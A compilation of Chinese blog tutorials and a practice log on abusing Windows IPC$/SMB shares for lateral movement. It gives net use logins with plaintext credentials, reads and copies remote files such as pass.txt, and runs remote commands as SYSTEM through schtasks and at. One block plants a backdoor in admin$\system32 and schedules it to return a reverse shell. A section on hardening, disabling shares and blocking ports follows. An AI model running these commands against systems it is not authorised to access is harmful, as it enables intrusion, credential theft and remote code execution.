# 第一篇

[内网渗透\_IPC](https://blog.csdn.net/qq_42383069/article/details/124018033)
========================================================================

2022-04-07 19:28:31

**0x01. 什么是IPC**

> IPC（共享命名管道资源）其实就是为了实现进程间通信而开放的命名管道；IPC可以通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算机的共享资源使用

简单理解：可以访问目标机器上的文件（上传、下载），也可以在目标标机器上运行命令

上传和下载文件直接通过 copy 命令就可以，不过路径缓存 UNC 路径

什么是UNC路径？就是以 \\ 开头的路径就是UNC路径，比如：`\\10.10.10.10\c$\users`

**0x02. IPC的利用条件**

**开启了139、445端口** `ipc$`可以实现远程登录及对默认共享资源的访问，而139端⼝的开启表示NetBIOS协议的应用

通过139、445端口可以实现对共享文件/打印机的访问。⼀般来讲`IPC$`需要139、445端口的支持

管理员开启了默认共享

默认共享是为了⽅便管理员进⾏远程管理⽽默认开启的，包括所有的逻辑盘（`c$,d$,e$`)等，和系统目录winnt或windows（`admin$`）。通过IPC$可以实现对这些默认共享⽬录的访问

**0x03. 为什么选择IPC渗透**

1、远程登录桌面会增加暴露风险

2、目标管理员可能对服务器禁用远程登录

**0x04. IPC 在内网渗透中的利用**

在这里假设我们获取到了⼀个域管理员的账户和密码：

```
user : redteam\saul
pass : admin!@#45
```

接下来演示⼀下通过此账号密码来利用 IPC 完成各个操作

**1、建立 IPC 连接（查看、上传、下载操作）**

假设我们获取到了 win7（10.10.10.7） 机器的权限，想要通过命令行对 win\_server2008（10.10.10.8） 机器进行操作

**1）建立 IPC连接：**

```
net use \\10.10.10.8 /u:redteam\saul admin!@#45
```

![在这里插入图片描述](%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_IPC.assets/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmV5b25kIE15,size_20,color_FFFFFF,t_70,g_se,x_16.png)

**2）删除 IPC 连接：**

```
net use \\10.10.10.8 /de /y
```

![在这里插入图片描述](%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_IPC.assets/073e144dbc9c45df99618b51af35690f.png) **3）查看目标的共享磁盘**

```
net view \\10.10.10.8
```

![在这里插入图片描述](%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_IPC.assets/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmV5b25kIE15,size_20,color_FFFFFF,t_70,g_se,x_16-16671923655111.png) **4）查看目标 C 盘下的文件**

```
dir \\10.10.10.12\c$
```

![在这里插入图片描述](%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_IPC.assets/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmV5b25kIE15,size_15,color_FFFFFF,t_70,g_se,x_16.png) **5）查看桌面目录下的pass.txt文件：** ![在这里插入图片描述](%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_IPC.assets/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmV5b25kIE15,size_16,color_FFFFFF,t_70,g_se,x_16.png)

```
type \\10.10.10.12\c$\pass.txt
```

![在这里插入图片描述](%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_IPC.assets/aec4859df53f465f98009362aaa9d6b1.png) **6）上传文件到目标 C 盘**  
比如我们桌面有一个文件，上传到目标桌面，命令如下：

```
copy 要上传的⽂件名 \\10.10.10.8\c$\
copy C:\Users\saul\Desktop\1.txt \\10.10.10.8\c$\Users\Administrator\Desktop\
```

![在这里插入图片描述](%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_IPC.assets/efeb21c145b64b28b8573e2f1a08188a.png) **7）下载目标 C 盘桌面下的 pass.txt 文件**  
下载文件我们也可以通过 copy 命令来完成：

```
copy \\10.10.10.8\c$\Users\Administrator\Desktop\flag.txt
```

![在这里插入图片描述](%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_IPC.assets/b2bee7963bad4614a4a1dc9046a12cbe.png) **8）使用tasklist列出远程主机的进程列表：**

```
/S : 指定连接到的计算机或IP地址，默认本机
/u [<Domain>\]<UserName> : 指定使⽤哪个⽤户执⾏这个命令
/P [password] : 为指定的⽤户指定密码。
例：tasklist /S 10.10.10.8 /U redteam\administrator /P Admin12345!
```

![在这里插入图片描述](%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_IPC.assets/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmV5b25kIE15,size_19,color_FFFFFF,t_70,g_se,x_16.png)

**9）查看远程主机的时间**  
有的时候我们想要在远程主机上执行定时任务，这个时候就需要知道目标主机的时间，这样就⽅便定时任务的执行

```
net time \\10.10.10.8
```

![在这里插入图片描述](%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_IPC.assets/61a50187dc724fbb99fa23861938fb38.png) **10）高版本下的机器运行计划任务执行命令：schtasks**

schtasks 命令允许管理员创建、删除、查询、更改、运行和终止本地或远程系统上的计划任务。

**在 Windows 2008 及之后使用！**

例：在目标主机win\_server2008（10.10.10.8） 中创建⼀个计划任务名为 test，并且以 system 身份每分钟运行⼀次1.txt

```
1、创建计划任务
schtasks /create /tn test /U redteam\saul /P admin!@#45 /tr "c:\1.txt" /sc MINUTE /mo 1 /s 10.10.10.8 /RU system
2、执⾏计划任务
schtasks /run /tn test /s 10.10.10.8 /U redteam\saul /P admin!@#45
3、删除计划任务
schtasks /F /delete /tn test /s 10.10.10.8 /U redteam\saul /P admin!@#45
```

![在这里插入图片描述](%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_IPC.assets/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmV5b25kIE15,size_20,color_FFFFFF,t_70,g_se,x_16-16671923655132.png)

目标机器已在后台运行！

![在这里插入图片描述](%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_IPC.assets/0cda6a4e3a964f4b88ec5a71b6a4fafc.png)

在任务计划程序中也可以看到

![在这里插入图片描述](%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_IPC.assets/0c22f7e0aa6744fb9e011dd586c0257e.png) **11）低版本下的机器运行计划任务执行命令：AT**

AT命令是Windows XP中内置的命令，它也可以媲美Windows中的“计划任务”，而且在计划的安排、任务的管理、工作事务的处理方面，AT命令具有更强⼤更神通的功能。AT命令可在指定时间和日期、在指定计算机上运行命令和程序

**AT 命令在 Windows 2008 以下的操作系统内置，例如 Windows 2003**

在使用 at 命令在远程机器上创建计划任务之前，需要使使用net use 命令建立ipc$：

1.  例如让目标机器 win\_server2008（10.10.10.8）在下午 5:20 分运行 calc.bat：

```
#查看⽬标系统时间
net time \\10.10.10.8
#将⽂件复制到⽬标系统中
copy calc.bat \\10.10.10.8\c$ 
#使⽤at创建计划任务
at \\10.10.10.8 5:20PM C:\calc.bat
#清除at记录
at \\10.10.10.8 ID /delete
```

![在这里插入图片描述](%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_IPC.assets/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmV5b25kIE15,size_18,color_FFFFFF,t_70,g_se,x_16.png)

已成功添加运行

![在这里插入图片描述](%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_IPC.assets/bd015d3f452441ad9735ad980b355b67.png)

2\. at 命令还可以利用 cmd 执行命令并把结果返回到⼀个文本里

```
# 使⽤cmd执⾏命令：
at \\10.10.10.8 5:40PM cmd.exe /c "ipconfig >C:/3.txt"
# type读取⽂本
type \\10.10.10.8\C$\3.txt
```

![在这里插入图片描述](%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_IPC.assets/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmV5b25kIE15,size_18,color_FFFFFF,t_70,g_se,x_16-16671923655143.png)



# 第二篇

[IPC$入侵](https://www.cnblogs.com/-meditation-/p/15695185.html)
==============================================================

IPC$概念
------

**IPC$** (Internet Process Connection) 是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问，在远程管理计算机和查看计算机的共享资源时使用。在同一时间内，两个IP之间只允许建立一个IPC$连接。NT2000在提供了 ipc$ 功能的同时，在初次安装系统时还打开了默认共享，即所有的逻辑共享(C$、D$、E$……)和系统目录(C:\\windows)共享。内网渗透中，会利用IPC$，访问共享资源，导出用户列表，并使用一些字典工具，进行密码探测。

利用条件
----

基础知识：

*   SMB: (Server Message Block) Windows协议族，用于文件打印共享的服务；
*   NBT: (NETBios Over TCP/IP)使用137（UDP）138（UDP）139（TCP）端口实现基于TCP/IP协议的NETBIOS网络互联。
*   在WindowsNT中SMB基于NBT实现，即使用139（TCP）端口；而在Windows2000中，SMB除了基于NBT实现，还可以直接通过445端口实现

对于win2000客户端（发起端）来说：

*   如果在允许NBT的情况下连接服务器时，客户端会同时尝试访问139和445端口，如果445端口有响应，那么就发送RST包给139端口断开连接，用455端口进行会话，当445端口无响应时，才使用139端口，如果两个端口都没有响应，则会话失败；
*   如果在禁止NBT的情况下连接服务器时，那么客户端只会尝试访问445端口，如果445端口无响应，那么会话失败。

对于win2000服务器端来说：

*   如果允许NBT, 那么UDP端口137, 138, TCP 端口 139, 445将开放（LISTENING）；
*   如果禁止NBT，那么只有445端口开放。

IPC$会话端口要求符合以上原则，所以要想建立IPC$会话需要满足两个条件

```
1)139或445端口开启：ipc$连接可以实现远程登陆及对默认共享的访问;而139端口的开启表示netbios协议的应用,我们可以通139,445(win2000)端口实现对共享文件/打印机的访问,因此一般来讲,ipc$连接是需要139或445端口来支持的。
2)管理员开启了默认共享：默认共享是为了方便管理员远程管理而默认开启的共享,即所有的逻辑盘(c$,d$,e$……)和系统目录winnt或windows(admin$),我们通过ipc$连接可以实现对这些默认共享的访问。
```

IPC$操作命令
--------

```
net use                               #查看连接
net share                             #查看本地开启的共享
net share ipc$                        #开启ipc$共享
net share ipc$ /del                   #删除ipc$共享
net share c$ /del                     #删除C盘共享
net share admin$ /del									#删除C:\Windows共享

net use \\192.168.1.2\ipc$ /u:"" ""     #与192.168.10.15建立ipc空连接
net use \\192.168.1.2      /u:"" ""     #与192.168.10.15建立ipc空连接，可以吧ipc$去掉
net use \\192.168.1.2 /u:"administrator" "admin"   #以administrator身份与192.168.1.2建立ipc连接
net use \\192.168.1.2 /del              #删除ipc连接

net use \\192.168.1.2\c$  /u:"administrator" "admin"  #建立C盘共享
dir \\192.168.1.2\c$                  #查看192.168.1.2 C盘文件
dir \\192.168.1.2\c$\test             #查看192.168.1.2 C盘文件下的test目录
dir \\192.168.1.2\c$\test\test.exe    #查看192.168.1.2 C盘文件下的test目录下的test.exe文件
net use \\192.168.1.2\c$  /del        #删除该C盘共享连接

net use g: \\192.168.1.2\c$  /u:"administrator" "admin"  #将目标C盘映射到本地K盘
net use g: /del                                         #删除该映射

copy test.exe \\192.168.1.2\C$       #上传exe到C盘
net time \\192.168.1.2						   #查看时间
at \\192.168.1.2\C$ 12:25 test.exe 	 #at运行程序 设置的时间要比主机时间快，不然无法启动


net view \\IP   #查看target的共享
netstat -A IP   #获取target的user列表

netstat -ano | findstr "port"  #查看端口号对应的PID
tasklist | findstr "PID"       #查看进程号对应的程序
```

实战经典利用
------

```
C:\>net use \\192.168.1.1\ipc$ /user:administrator "" 	#建立一个空链接,账户要有权限
C:\>net view \\192.168.1.1	#查看远程的共享资源
C:\>copy test.exe \\192.168.1.1\admin$\system32  #将一次性后门test.exe复制到对方的系统文件夹下，前提是admin$开启
C:\>net time \\192.168.1.1	#查看远程主机的当前时间
C:\>at \\192.168.1.1 时间 test.exe #设置时间执行木马反弹shell
```

IPC$连接失败的原因
-----------

```
1)你的系统不是NT或以上操作系统。
2)对方没有打开ipc$默认共享。
3)不能成功连接目标的139，445端口。
4)命令输入错误。
5)用户名或密码错误。
```

常见错误号
-----

```
1)错误号5，拒绝访问：很可能你使用的用户不是管理员权限的，先提升权限。
2)错误号51，Windows 无法找到网络路径：网络有问题。
3)错误号53，找不到网络路径：ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）。
4)错误号67，找不到网络名：你的lanmanworkstation服务未启动；目标删除了ipc$。
5)错误号1219，提供的凭据与已存在的凭据集冲突：你已经和对方建立了一个ipc$，请删除再连。
6)错误号1326，未知的用户名或错误密码：原因很明显了。
7)错误号1792，试图登录，但是网络登录服务没有启动：目标NetLogon服务未启动。（连接域控会出现此情况）。
8)错误号2242，此用户的密码已经过期：目标有帐号策略，强制定期要求更改密码。
```

防护措施
----

*   禁止空连接进行枚举

```
运行regedit，找到如下主键[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA]把RestrictAnonymous = DWORD的键值改为：1，如果设置为"1"，一个匿名用户仍然可以连接到IPC$共享，但无法通过这种连接得到列举SAM帐号和共享信息的权限；在Windows 2000 中增加了"2"，未取得匿名权的用户将不能进行ipc$空连接。建议设置为1。如果上面所说的主键不存在，就新建一个再改键值。如果你觉得改注册表麻烦，可以在本地安全设置中设置此项： 在本地安全设置－本地策略－安全选项－"对匿名连接的额外限制"
```

*   禁止默认共享

```
#删除共享(每次输入一个）
net share #查看共享
net share ipc$ /delete
net share admin$ /delete
net share c$ /delete
net share d$ /delete（如果有e,f,……可以继续删除）

#停止server服务
net stop server /y （重新启动后server服务会重新开启）

#禁止自动打开默认共享
运行regedit
server版:找到如下主键[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters]把AutoShareServer（DWORD）的键值改为:00000000。 
pro版:找到如下主键[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters]把AutoShareWks（DWORD）的键值改为:00000000。 
这两个键值在默认情况下在主机上是不存在的，需要自己手动添加，修改后重起机器使设置生效。

#关闭ipc$和默认共享依赖的服务:server服务
控制面板-管理工具-服务-找到server服务（右击）-属性-常规-启动类型-选已禁用，这时可能会有提示说：XXX服务也会关闭是否继续，因为还有些次要的服务要依赖于server服务，不要管它。 

#屏蔽139，445端口，都要屏蔽
1)139端口可以通过禁止NBT来屏蔽，本地连接－TCP/IT属性－高级－WINS－选"禁用TCP/IT上的NETBIOS"
2)445端口可以通过修改注册表来屏蔽。添加一个键值
Hive: HKEY_LOCAL_MACHINE
Key: System\Controlset\Services\NetBT\Parameters
Name: SMBDeviceEnabled 
Type: REG_DWORD
value: 0
修改完后重启机器

#设置复杂密码，防止通过ipc$穷举出密码
```

**参考链接**

[https://blog.csdn.net/u010984552/article/details/54890187](https://blog.csdn.net/u010984552/article/details/54890187)

[https://www.cnblogs.com/bmjoker/p/10355934.html](https://www.cnblogs.com/bmjoker/p/10355934.html)

  

# 实战

1.建立连接IPC$

```
net use \\192.168.116.1 /u:PC-20220607OTTC\Administrator 879086359
net use
dir \\192.168.116.1\c$
```



![image-20221031180844104](%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_IPC.assets/image-20221031180844104.png)



2.远程查看目录

```
dir \\192.168.116.1\c$\Users\Administrator\Desktop
```

![image-20221031181034446](%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_IPC.assets/image-20221031181034446.png)



3.上传

```
copy test.txt \\192.168.116.1\c$\Users\Administrator\Desktop\
type \\192.168.116.1\c$\Users\Administrator\Desktop\test.txt
```

![image-20221031181531609](%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_IPC.assets/image-20221031181531609.png)



4.下载

```
copy  \\192.168.116.1\c$\Users\Administrator\Desktop\123.bin
```



![image-20221031181739220](%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_IPC.assets/image-20221031181739220.png)



5.获取磁盘:d 映射

```
C:\Users\admin\Desktop>net use f: \\192.168.116.1\d$  /u:"PC-20220607OTTC\Administrator" "879086359"
```



![image-20221031182225868](%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F_IPC.assets/image-20221031182225868.png)